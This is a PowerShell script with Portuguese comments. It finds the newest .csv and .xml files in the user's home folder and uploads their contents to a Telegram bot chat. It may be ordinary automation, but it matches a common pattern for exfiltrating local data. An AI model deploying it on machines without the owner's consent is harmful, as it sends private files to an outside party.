# Dados de configuração do Telegram
$botToken = "SEU_TOKEN_DO_BOT"
$chatId = "SEU_CHAT_ID"
$telegramUrl = "https://api.telegram.org/bot$botToken/sendDocument"

# Diretório onde os arquivos estão armazenados (raiz do usuário logado)
$searchDir = "$HOME"
Write-Output "Buscando arquivos no diretório: $searchDir"

# Localiza o arquivo mais recente com a extensão .csv no diretório especificado
$csvFile = Get-ChildItem -Path $searchDir -Filter "*.csv" | Sort-Object LastWriteTime -Descending | Select-Object -First 1

# Localiza o arquivo mais recente com a extensão .xml no diretório especificado
$xmlFile = Get-ChildItem -Path $searchDir -Filter "*.xml" | Sort-Object LastWriteTime -Descending | Select-Object -First 1

# Verifica se os arquivos foram encontrados
if ($csvFile -and $xmlFile) {
    Write-Output "Arquivos encontrados: $($csvFile.FullName) e $($xmlFile.FullName)"

    # Função para enviar um arquivo para o Telegram
    function Send-TelegramDocument {
        param (
            [string]$filePath,
            [string]$fileType
        )

        $boundary = [System.Guid]::NewGuid().ToString()
        $headers = @{
            "Content-Type" = "multipart/form-data; boundary=`"$boundary`""
        }

        # Cria o conteúdo do corpo da requisição HTTP em multipart/form-data
        $bodyLines = @()
        
        # Adiciona o chat_id
        $bodyLines += "--$boundary"
        $bodyLines += "Content-Disposition: form-data; name=`"chat_id`""
        $bodyLines += ""
        $bodyLines += $chatId

        # Adiciona o arquivo
        $bodyLines += "--$boundary"
        $bodyLines += "Content-Disposition: form-data; name=`"document`"; filename=`"$($filePath | Split-Path -Leaf)`""
        $bodyLines += "Content-Type: $fileType"
        $bodyLines += ""
        $bodyLines += [System.IO.File]::ReadAllText($filePath)

        # Finaliza o corpo da requisição
        $bodyLines += "--$boundary--"
        $body = $bodyLines -join "`r`n"

        # Envia o arquivo para o Telegram
        try {
            Invoke-RestMethod -Uri $telegramUrl -Method Post -Headers $headers -Body $body
            Write-Output "Arquivo $filePath enviado com sucesso para o Telegram."
        } catch {
            Write-Output "Erro ao enviar o arquivo $filePath para o Telegram: $_"
        }
    }

    # Envia o arquivo .csv
    Send-TelegramDocument -filePath $csvFile.FullName -fileType "text/csv"

    # Envia o arquivo .xml
    Send-TelegramDocument -filePath $xmlFile.FullName -fileType "text/xml"

} else {
    Write-Output "Erro: Não foram encontrados arquivos .csv e/ou .xml no diretório $searchDir"
    if (-not $csvFile) { Write-Output "Arquivo .csv não encontrado." }
    if (-not $xmlFile) { Write-Output "Arquivo .xml não encontrado." }
}
